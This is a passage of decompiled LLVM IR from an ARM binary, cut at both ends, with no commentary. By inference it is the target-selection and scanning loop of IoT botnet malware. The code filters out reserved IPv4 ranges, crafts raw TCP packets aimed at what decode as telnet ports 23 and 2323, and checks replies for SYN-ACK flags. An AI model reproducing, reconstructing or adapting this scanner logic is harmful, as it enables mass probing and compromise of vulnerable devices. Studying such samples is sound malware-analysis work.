  %v3_e93c = or i1 %v7_e938, %v2_e93c
  br i1 %v3_e93c, label %dec_label_pc_e8a4, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %.thread13, %dec_label_pc_e938, %bb382
  %v2_e940 = icmp ugt i32 %v1_e8a8, 168
  store i1 %v2_e940, i1* %cpsr_c.global-to-local, align 1
  %v7_e940 = icmp eq i32 %v1_e8a8, 169
  store i1 %v7_e940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e940, label %bb383, label %dec_label_pc_e94c

bb383:                                            ; preds = %dec_label_pc_e940
  %v3_e944 = icmp eq i32 %v1_e8bc, 255
  store i1 %v3_e944, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e944, label %dec_label_pc_e8a4, label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e940, %bb383
  %v7_e94c = icmp eq i32 %v1_e8a8, 198
  %.463 = zext i1 %v7_e94c to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e958 = icmp ugt i32 %v1_e8bc, 16
  store i1 %v2_e958, i1* %cpsr_c.global-to-local, align 1
  %v7_e958 = icmp eq i32 %v1_e8bc, 17
  store i1 %v7_e958, i1* %cpsr_z.global-to-local, align 1
  %v2_e95c = xor i1 %v2_e958, true
  %v3_e95c = or i1 %v7_e958, %v2_e95c
  br i1 %v3_e95c, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e94c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e970

bb386:                                            ; preds = %dec_label_pc_e94c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e960 = icmp eq i1 %v7_e94c, false
  store i1 %v2_e960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e960, label %dec_label_pc_e970, label %dec_label_pc_e968

dec_label_pc_e968:                                ; preds = %bb386
  %v2_e968 = icmp ugt i32 %v1_e8bc, 18
  store i1 %v2_e968, i1* %cpsr_c.global-to-local, align 1
  %v7_e968 = icmp eq i32 %v1_e8bc, 19
  store i1 %v7_e968, i1* %cpsr_z.global-to-local, align 1
  %v2_e96c = xor i1 %v2_e968, true
  %v3_e96c = or i1 %v7_e968, %v2_e96c
  br i1 %v3_e96c, label %dec_label_pc_e8a4, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %.thread19, %dec_label_pc_e968, %bb386
  %v2_e970 = icmp ugt i32 %v1_e8a8, 222
  store i1 %v2_e970, i1* %cpsr_c.global-to-local, align 1
  %v7_e970 = icmp eq i32 %v1_e8a8, 223
  store i1 %v7_e970, i1* %cpsr_z.global-to-local, align 1
  %v2_e974 = xor i1 %v7_e970, true
  %v3_e974 = and i1 %v2_e970, %v2_e974
  br i1 %v3_e974, label %dec_label_pc_e8a4, label %dec_label_pc_e978

dec_label_pc_e978:                                ; preds = %dec_label_pc_e970
  %v7_e978 = icmp eq i32 %v1_e8a8, 106
  %.464 = zext i1 %v7_e978 to i32
  %v2_e984 = icmp ugt i32 %v1_e8bc, 185
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  %v7_e984 = icmp eq i32 %v1_e8bc, 186
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e984, label %bb389, label %dec_label_pc_e990

bb389:                                            ; preds = %dec_label_pc_e978
  %v2_e978 = icmp ugt i32 %v1_e8a8, 105
  store i1 %v2_e978, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e978, label %dec_label_pc_e8a4, label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e978, %bb389
  %v2_e990 = icmp ugt i32 %v1_e8bc, 186
  store i1 %v2_e990, i1* %cpsr_c.global-to-local, align 1
  %v7_e990 = icmp eq i32 %v1_e8bc, 187
  store i1 %v7_e990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e990, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e990
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9a4

.thread24:                                        ; preds = %dec_label_pc_e990
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e99c = icmp eq i1 %v7_e978, false
  store i1 %v2_e99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e99c, label %dec_label_pc_e9a4, label %dec_label_pc_e8a4

dec_label_pc_e9a4:                                ; preds = %.thread25, %.thread24
  %v2_e9a4 = icmp ugt i32 %v1_e8bc, 184
  store i1 %v2_e9a4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a4 = icmp eq i32 %v1_e8bc, 185
  store i1 %v7_e9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a4, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e9a4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9b8

.thread28:                                        ; preds = %dec_label_pc_e9a4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9b0 = icmp eq i1 %v7_e978, false
  store i1 %v2_e9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9b0, label %dec_label_pc_e9b8, label %dec_label_pc_e8a4

dec_label_pc_e9b8:                                ; preds = %.thread29, %.thread28
  %v2_e9b8 = icmp ugt i32 %v1_e8bc, 183
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b8 = icmp eq i32 %v1_e8bc, 184
  store i1 %v7_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b8, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e9b8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9cc

.thread32:                                        ; preds = %dec_label_pc_e9b8
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9c4 = icmp eq i1 %v7_e978, false
  store i1 %v2_e9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9c4, label %dec_label_pc_e9cc, label %dec_label_pc_e8a4

dec_label_pc_e9cc:                                ; preds = %.thread33, %.thread32
  %v2_e9cc = icmp ugt i32 %v1_e8a8, 149
  store i1 %v2_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9cc = icmp eq i32 %v1_e8a8, 150
  store i1 %v7_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9cc, label %bb390, label %dec_label_pc_e9d8

bb390:                                            ; preds = %dec_label_pc_e9cc
  %v3_e9d0 = icmp ugt i32 %v1_e8bc, 30
  store i1 %v3_e9d0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9d0 = icmp eq i32 %v1_e8bc, 31
  store i1 %v8_e9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9d0, label %dec_label_pc_e8a4, label %dec_label_pc_e9d8

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e9cc, %bb390
  %v2_e9d8 = icmp ugt i32 %v1_e8a8, 48
  store i1 %v2_e9d8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d8 = icmp eq i32 %v1_e8a8, 49
  store i1 %v7_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d8, label %bb391, label %dec_label_pc_e9e4

bb391:                                            ; preds = %dec_label_pc_e9d8
  %v3_e9dc = icmp ugt i32 %v1_e8bc, 50
  store i1 %v3_e9dc, i1* %cpsr_c.global-to-local, align 1
  %v8_e9dc = icmp eq i32 %v1_e8bc, 51
  store i1 %v8_e9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9dc, label %dec_label_pc_e8a4, label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9d8, %bb391
  %v2_e9e4 = icmp ugt i32 %v1_e8a8, 177
  store i1 %v2_e9e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e4 = icmp eq i32 %v1_e8a8, 178
  store i1 %v7_e9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e4, label %bb392, label %dec_label_pc_e9f0

bb392:                                            ; preds = %dec_label_pc_e9e4
  %v3_e9e8 = icmp ugt i32 %v1_e8bc, 61
  store i1 %v3_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9e8 = icmp eq i32 %v1_e8bc, 62
  store i1 %v8_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9e8, label %dec_label_pc_e8a4, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9e4, %bb392
  %v2_e9f0 = icmp ugt i32 %v1_e8a8, 159
  store i1 %v2_e9f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f0 = icmp eq i32 %v1_e8a8, 160
  store i1 %v7_e9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f0, label %bb393, label %dec_label_pc_e9fc

bb393:                                            ; preds = %dec_label_pc_e9f0
  %v3_e9f4 = icmp ugt i32 %v1_e8bc, 12
  store i1 %v3_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v8_e9f4 = icmp eq i32 %v1_e8bc, 13
  store i1 %v8_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f4, label %dec_label_pc_e8a4, label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9f0, %bb393
  %v1_e9fc = add nsw i32 %v1_e8a8, -6
  store i32 %v1_e9fc, i32* %r3.global-to-local, align 4
  %v2_ea00 = icmp ugt i32 %v1_e8a8, 10
  store i1 %v2_ea00, i1* %cpsr_c.global-to-local, align 1
  %v7_ea00 = icmp eq i32 %v1_e8a8, 11
  store i1 %v7_ea00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea00, label %dec_label_pc_e8a4, label %bb394

bb394:                                            ; preds = %dec_label_pc_e9fc
  %v3_ea04 = icmp ne i32 %v1_e9fc, 0
  store i1 %v3_ea04, i1* %cpsr_c.global-to-local, align 1
  %v8_ea04 = icmp eq i32 %v1_e9fc, 1
  store i1 %v8_ea04, i1* %cpsr_z.global-to-local, align 1
  %v2_ea08 = xor i1 %v3_ea04, true
  %v3_ea08 = or i1 %v8_ea04, %v2_ea08
  br i1 %v3_ea08, label %dec_label_pc_e8a4, label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %bb394
  %v2_ea0c = icmp ugt i32 %v1_e8a8, 21
  store i1 %v2_ea0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea0c = icmp eq i32 %v1_e8a8, 22
  store i1 %v7_ea0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea0c, label %dec_label_pc_e8a4, label %bb395

bb395:                                            ; preds = %dec_label_pc_ea0c
  %v3_ea10 = icmp ugt i32 %v1_e8a8, 20
  store i1 %v3_ea10, i1* %cpsr_c.global-to-local, align 1
  %v8_ea10 = icmp eq i32 %v1_e8a8, 21
  store i1 %v8_ea10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea10, label %dec_label_pc_e8a4, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %bb395
  %v2_ea18 = icmp ugt i32 %v1_e8a8, 27
  store i1 %v2_ea18, i1* %cpsr_c.global-to-local, align 1
  %v7_ea18 = icmp eq i32 %v1_e8a8, 28
  store i1 %v7_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea18, label %dec_label_pc_e8a4, label %bb396

bb396:                                            ; preds = %dec_label_pc_ea18
  %v3_ea1c = icmp ugt i32 %v1_e8a8, 25
  store i1 %v3_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea1c = icmp eq i32 %v1_e8a8, 26
  store i1 %v8_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea1c, label %dec_label_pc_e8a4, label %dec_label_pc_ea24

dec_label_pc_ea24:                                ; preds = %bb396
  %v2_ea24 = icmp ugt i32 %v1_e8a8, 29
  store i1 %v2_ea24, i1* %cpsr_c.global-to-local, align 1
  %v7_ea24 = icmp eq i32 %v1_e8a8, 30
  store i1 %v7_ea24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea24, label %dec_label_pc_e8a4, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea24
  %v3_ea28 = icmp ugt i32 %v1_e8a8, 28
  store i1 %v3_ea28, i1* %cpsr_c.global-to-local, align 1
  %v8_ea28 = icmp eq i32 %v1_e8a8, 29
  store i1 %v8_ea28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea28, label %dec_label_pc_e8a4, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %bb397
  %v2_ea30 = icmp ugt i32 %v1_e8a8, 54
  store i1 %v2_ea30, i1* %cpsr_c.global-to-local, align 1
  %v7_ea30 = icmp eq i32 %v1_e8a8, 55
  store i1 %v7_ea30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea30, label %dec_label_pc_e8a4, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea30
  %v3_ea34 = icmp ugt i32 %v1_e8a8, 32
  store i1 %v3_ea34, i1* %cpsr_c.global-to-local, align 1
  %v8_ea34 = icmp eq i32 %v1_e8a8, 33
  store i1 %v8_ea34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea34, label %dec_label_pc_e8a4, label %dec_label_pc_ea3c

dec_label_pc_ea3c:                                ; preds = %bb398
  %v2_ea3c = icmp ugt i32 %v1_e8a8, 214
  store i1 %v2_ea3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea3c = icmp eq i32 %v1_e8a8, 215
  store i1 %v7_ea3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea3c, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea3c
  %v3_ea40 = icmp ugt i32 %v1_e8a8, 213
  store i1 %v3_ea40, i1* %cpsr_c.global-to-local, align 1
  %v8_ea40 = icmp eq i32 %v1_e8a8, 214
  store i1 %v8_ea40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea40, label %bb400, label %dec_label_pc_ea50

.thread48:                                        ; preds = %dec_label_pc_ea3c
  br label %dec_label_pc_e8a4

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e8a4

dec_label_pc_ea50:                                ; preds = %bb399
  %v5_ea5c = call i32 @llvm.bswap.i32(i32 %v0_e8a4)
  store i32 %v5_ea5c, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e8a4, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_ea64 = udiv i32 %v5_ea5c, 16777216
  %tmp403 = and i32 %v0_e8a4, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_ea6c = udiv i32 %tmp402, 256
  %v4_ea70 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e8a4, 65536
  %v3_ea78 = icmp ne i32 %tmp405, 0
  store i1 %v3_ea78, i1* %cpsr_c.global-to-local, align 1
  %v4_ea78 = mul i32 %v5_ea5c, 16777216
  %v5_ea6c = or i32 %v4_ea78, %v3_ea64
  %v5_ea70 = or i32 %v5_ea6c, %v4_ea6c
  %v5_ea78 = or i32 %v5_ea70, %v4_ea70
  store i32 %v5_ea78, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_1ea02.179 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_ea78, i32* @global_var_1ea08.180, align 4
  %v3_ea88 = call i32 @function_c848(i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32 20)
  %v4_ea88 = trunc i32 %v3_ea88 to i16
  store i32 %v3_ea88, i32* %r0.global-to-local, align 4
  %v3_ea8c = load i32, i32* %stack_var_-52, align 4
  %v5_ea9c = sdiv i32 %v3_ea8c, 10
  %v3_eaa0 = mul i32 %v5_ea9c, 8
  store i32 %v3_eaa0, i32* %r2.global-to-local, align 4
  %v2_eaa8 = mul i32 %v5_ea9c, 10
  store i32 %v2_eaa8, i32* %r3.global-to-local, align 4
  %v3_eaac = icmp uge i32 %v3_ea8c, %v2_eaa8
  store i1 %v3_eaac, i1* %cpsr_c.global-to-local, align 1
  %v9_eaac = icmp eq i32 %v3_ea8c, %v2_eaa8
  store i1 %v9_eaac, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_eaac, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea50
  store i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_ea88, i16* bitcast (i32* @global_var_1ea02.179 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32 2) to i16*), align 2
  %v4_eacc = load i32, i32* @global_var_1ea08.180, align 4
  store i32 %v4_eacc, i32* @global_var_1ea10.182, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea50
  store i16 %v4_ea88, i16* bitcast (i32* @global_var_1ea02.179 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %r0.global-to-local, align 4
  %v4_eacc54 = load i32, i32* @global_var_1ea08.180, align 4
  store i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eacc54, i32* @global_var_1ea10.182, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_1ea1c.183 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_eaf8 = call i32 @function_c898(i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32 sext (i16 ptrtoint (i16* @global_var_1ea0c.140 to i16) to i32), i32 5120, i32 20)
  %v7_eaf8 = trunc i32 %v6_eaf8 to i16
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %r1.global-to-local, align 4
  %v2_eb04 = load i32, i32* @global_var_20a7c.135, align 4
  store i16 %v7_eaf8, i16* bitcast (i32* @global_var_1ea1c.183 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 %v2_f9a4, i32* %ip.global-to-local, align 4
  store i32 %v2_eb04, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb4c = call i32 @function_11570(i32 %v2_eb04, i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32 40, i32 16384, i32 %v2_e874, i32 16)
  store i32 %v7_eb4c, i32* %r0.global-to-local, align 4
  %v3_eb50 = load i32, i32* %stack_var_-52, align 4
  %v1_eb54 = add i32 %v3_eb50, 1
  store i32 %v1_eb54, i32* %r3.global-to-local, align 4
  %v3_eb58 = icmp ugt i32 %v1_eb54, 383
  store i1 %v3_eb58, i1* %cpsr_c.global-to-local, align 1
  %v8_eb58 = icmp eq i32 %v1_eb54, 384
  store i1 %v8_eb58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb54, i32* %stack_var_-52, align 4
  %v5_eb60 = icmp slt i32 %v1_eb54, 384
  br i1 %v5_eb60, label %dec_label_pc_e878, label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %bb407
  %v0_eb64 = load i32, i32* @r4, align 4
  br label %dec_label_pc_eb68

dec_label_pc_eb68:                                ; preds = %dec_label_pc_e854, %dec_label_pc_eb64
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e854 ], [ %v0_eb64, %dec_label_pc_eb64 ]
  %v0_eb68 = call i32 @function_11204()
  store i32 %v0_eb68, i32* %fp.global-to-local, align 4
  store i32 %v2_e84c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_eb78, i32* @r4, align 4
  br label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_ec3c, %dec_label_pc_ec34, %dec_label_pc_ec2c, %dec_label_pc_ec08, %dec_label_pc_ebf8, %dec_label_pc_ebdc, %dec_label_pc_ebc4, %dec_label_pc_ec24, %dec_label_pc_ec18, %dec_label_pc_ebbc, %dec_label_pc_ecf4, %dec_label_pc_eb68
  %v1_eb80 = phi i32 [ %v0_eb68, %dec_label_pc_eb68 ], [ %v1_eb80.pre.pre, %dec_label_pc_ecf4 ], [ %v0_ebb0, %dec_label_pc_ebbc ], [ %v0_ebb0, %dec_label_pc_ec18 ], [ %v0_ebb0, %dec_label_pc_ec24 ], [ %v0_ebb0, %dec_label_pc_ebc4 ], [ %v0_ebb0, %dec_label_pc_ebdc ], [ %v0_ebb0, %dec_label_pc_ebf8 ], [ %v0_ebb0, %dec_label_pc_ec08 ], [ %v0_ebb0, %dec_label_pc_ec2c ], [ %v0_ebb0, %dec_label_pc_ec34 ], [ %v0_ebb0, %dec_label_pc_ec3c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb80 = inttoptr i32 %v1_eb80 to i32*
  store i32 0, i32* %v2_eb80, align 4
  %v2_eb8c = load i32, i32* @global_var_20a7c.135, align 4
  store i32 %v2_eb8c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e84c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eb9c = load i32, i32* %ip.global-to-local, align 4
  %v6_eba4 = call i32 @function_114fc(i32 %v2_eb8c, i32 %v2_e84c, i32 1514, i32 16384, i32 %v0_eb9c, i32 %v0_eb9c)
  store i32 %v6_eba4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eba8 = icmp eq i32 %v6_eba4, 0
  store i1 %v2_eba8, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_eba4, 1
  br i1 %tmp408, label %dec_label_pc_ed04, label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_eb7c
  %v0_ebb0 = load i32, i32* %fp.global-to-local, align 4
  %v1_ebb0 = inttoptr i32 %v0_ebb0 to i32*
  %v2_ebb0 = load i32, i32* %v1_ebb0, align 4
  store i32 %v2_ebb0, i32* %r3.global-to-local, align 4
  %v2_ebb4 = icmp ugt i32 %v2_ebb0, 10
  store i1 %v2_ebb4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebb4 = icmp eq i32 %v2_ebb0, 11
  store i1 %v7_ebb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebb4, label %dec_label_pc_ed04, label %dec_label_pc_ebbc

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_ebb0
  %v2_ebbc = icmp ugt i32 %v6_eba4, 38
  store i1 %v2_ebbc, i1* %cpsr_c.global-to-local, align 1
  %v7_ebbc = icmp eq i32 %v6_eba4, 39
  store i1 %v7_ebbc, i1* %cpsr_z.global-to-local, align 1
  %v2_ebc0 = xor i1 %v2_ebbc, true
  %v3_ebc0 = or i1 %v7_ebbc, %v2_ebc0
  br i1 %v3_ebc0, label %dec_label_pc_eb7c, label %dec_label_pc_ebc4

dec_label_pc_ebc4:                                ; preds = %dec_label_pc_ebbc
  store i32 %v2_e84c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %ip.global-to-local, align 4
  %v3_ebcc = load i32, i32* %v2_ebcc, align 4
  store i32 %v3_ebcc, i32* %r2.global-to-local, align 4
  %v2_ebd0 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_ebd0, i32* %r3.global-to-local, align 4
  %v3_ebd4 = icmp uge i32 %v3_ebcc, %v2_ebd0
  store i1 %v3_ebd4, i1* %cpsr_c.global-to-local, align 1
  %v9_ebd4 = icmp eq i32 %v3_ebcc, %v2_ebd0
  store i1 %v9_ebd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebd4, label %dec_label_pc_ebdc, label %dec_label_pc_eb7c

dec_label_pc_ebdc:                                ; preds = %dec_label_pc_ebc4
  %v3_ebe0 = load i8, i8* %v2_ebe0, align 1
  %v4_ebe0 = zext i8 %v3_ebe0 to i32
  store i32 %v4_ebe0, i32* %r3.global-to-local, align 4
  %v2_ebe4 = icmp ugt i8 %v3_ebe0, 5
  store i1 %v2_ebe4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebe4 = icmp eq i8 %v3_ebe0, 6
  store i1 %v7_ebe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebe4, label %dec_label_pc_ebec, label %dec_label_pc_eb7c

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebdc
  %v0_ebec = load i32, i32* @r4, align 4
  %v1_ebec = inttoptr i32 %v0_ebec to i16*
  %v2_ebec = load i16, i16* %v1_ebec, align 2
  %v3_ebec = zext i16 %v2_ebec to i32
  store i32 %v3_ebec, i32* %ip.global-to-local, align 4
  %v2_ebf0 = icmp ugt i16 %v2_ebec, 5887
  store i1 %v2_ebf0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebf0 = icmp eq i16 %v2_ebec, 5888
  store i1 %v7_ebf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf0, label %dec_label_pc_ec08, label %dec_label_pc_ebf8

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebec
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ec00 = icmp ugt i16 %v2_ebec, 4872
  store i1 %v3_ec00, i1* %cpsr_c.global-to-local, align 1
  %v9_ec00 = icmp eq i16 %v2_ebec, 4873
  store i1 %v9_ec00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec00, label %dec_label_pc_ec08, label %dec_label_pc_eb7c

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ebf8, %dec_label_pc_ebec
  %v1_ec08 = add i32 %v0_ebec, 2
  %v2_ec08 = inttoptr i32 %v1_ec08 to i16*
  %v3_ec08 = load i16, i16* %v2_ec08, align 2
  %v4_ec08 = zext i16 %v3_ec08 to i32
  store i32 %v4_ec08, i32* %r3.global-to-local, align 4
  store i32 %v4_e71c, i32* %r0.global-to-local, align 4
  %v3_ec10 = icmp uge i32 %v4_ec08, %v4_e71c
  store i1 %v3_ec10, i1* %cpsr_c.global-to-local, align 1
  %v9_ec10 = icmp eq i32 %v4_ec08, %v4_e71c
  store i1 %v9_ec10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec10, label %dec_label_pc_ec18, label %dec_label_pc_eb7c

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ec08
  %v1_ec18 = add i32 %v0_ebec, 13
  %v2_ec18 = inttoptr i32 %v1_ec18 to i8*
  %v3_ec18 = load i8, i8* %v2_ec18, align 1
  %v4_ec18 = zext i8 %v3_ec18 to i32
  store i32 %v4_ec18, i32* %r3.global-to-local, align 4
  %v1_ec1c = and i32 %v4_ec18, 2
  %v2_ec1c = icmp eq i32 %v1_ec1c, 0
  store i1 %v2_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec1c, label %dec_label_pc_eb7c, label %dec_label_pc_ec24

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ec18
  %v1_ec24 = and i32 %v4_ec18, 16
  %v2_ec24 = icmp eq i32 %v1_ec24, 0
  store i1 %v2_ec24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec24, label %dec_label_pc_eb7c, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec24
  %v1_ec2c = and i32 %v4_ec18, 4
  %v2_ec2c = icmp eq i32 %v1_ec2c, 0
  store i1 %v2_ec2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec2c, label %dec_label_pc_ec34, label %dec_label_pc_eb7c

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec2c
  %tmp = urem i8 %v3_ec18, 2
  %v2_ec34 = icmp eq i8 %tmp, 0
  store i1 %v2_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec34, label %dec_label_pc_ec3c, label %dec_label_pc_eb7c

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec34
  %v1_ec3c = add i32 %v0_ebec, 8
  %v2_ec3c = inttoptr i32 %v1_ec3c to i32*
  %v3_ec3c = load i32, i32* %v2_ec3c, align 4
  %v5_ec54 = call i32 @llvm.bswap.i32(i32 %v3_ec3c)
